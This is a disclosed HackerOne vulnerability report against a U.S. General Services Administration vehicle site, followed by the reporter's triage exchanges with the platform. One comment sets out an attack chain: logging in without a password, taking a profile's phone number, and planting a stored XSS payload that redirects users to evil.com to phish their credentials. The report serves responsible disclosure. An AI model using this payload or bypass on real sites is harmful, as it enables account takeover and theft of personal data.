---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
date: 2022-04-16
submitted: 2022-02-17T10:11:36.538Z
bounty_usd: null
votes: 14
cve: []
program: "[[programs/gsa_vdp|U.S. General Services Administration]]"
reporter: "imthatt"
source: "https://hackerone.com/reports/1483201"
title: "Account takeover leading to PII chained with stored XSS"
---
# Account takeover leading to PII chained with stored XSS

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 14 | **Program:** U.S. General Services Administration | **Disclosed:** 2022-04-16

- Report: [https://hackerone.com/reports/1483201](https://hackerone.com/reports/1483201)
- CWE: Improper Authentication - Generic
- Submitted: 2022-02-17T10:11:36.538Z

## Timeline

- **Report Filed**
- **2022-02-17** @imthatt: Sorry site is https://vehiclestd.fas.gsa.gov/ not the one I posted above, follow all other steps cheers.
- **2022-02-17** @imthatt: If you want to see the criticallity of this issue
1. login as my account on https://vehiclestd.fas.gsa.gov/  (pretend i am victim and a gov official) using email address itsdavenn@gmail.com (notice you dont need password!!)
2. Steal my mobile number under my profile tab
3. on the Title and First name tag, write the payload l" autofocus onfocus=location.replace("https://evil.com") x=""
4. Submit 
5. I come along, i log into my account, i go to my profile you have just edited i am then redirected to website of your choice, your website is made to look like further gov website and i enter my credentials to another us gov site here.
6. Boom, you now have multiple logins as me!

Account takeover stealing PII (phone number and stored XSS to further the attack!)
- **Report Duplicate**
- **2022-02-21** @imthatt: Hello this is not a duplicate of 1480265. Please read the website names carefully. This site is https://vehiclestd.fas.gsa.gov/ the other is 
https://vehiclestdb.fas.gsa.gov/
- **Report Reopened**
- **2022-02-21** @h1_analyst_diego: Hi @hollaatm3 - I'm discussing this submission internally with the U.S. General Services Administration team. You will be updated as soon as there is additional information to share. Thanks for your patience!
- **2022-02-21** @imthatt: Does this mean you can triage? Or do I have to wait? Many thanks
Holla
- **2022-02-21** @imthatt: @spikes  If you could keep my updated on the triage question that would be amazing!

Thanks all
- **2022-02-21** @h1_analyst_diego: Hello @hollaatm3,

It means that I have submitted your report to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.

Thanks,
@spikes
- **2022-02-21** @imthatt: Hi @spikes thank you, i see the report is still set as new, could you please Triage it on the options then please? Makes sense if it is submitted to the team to triage the report so i can continue hunting.

Many thanks
Holla
- **2022-02-21** @imthatt: Hi @spikes sorry following on from this, rep is the only motivating part here, ovbs you call the shots but i am confused why this is pending action from the U.S General whilst the status is still as "New" and not "triaged". I will not get my +7 rep points when U.S resolves. Please help or inform me. 

Have a great day!
- **2022-02-22** @imthatt: hi @spikes are you able to triage please? As you have submitted it to the team
- **2022-03-01** @imthatt: Hi all @spikes any update on this one? Please note accounts that are not mine have not been touched on this POC. Cheere
- **2022-03-02** @h1_analyst_diego: Hi @hollaatm3 - Unfortunately we don't have new information to share at the time, but we will let you know as soon as we do.

Thank you for your patience!

Regards,
@spikes
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
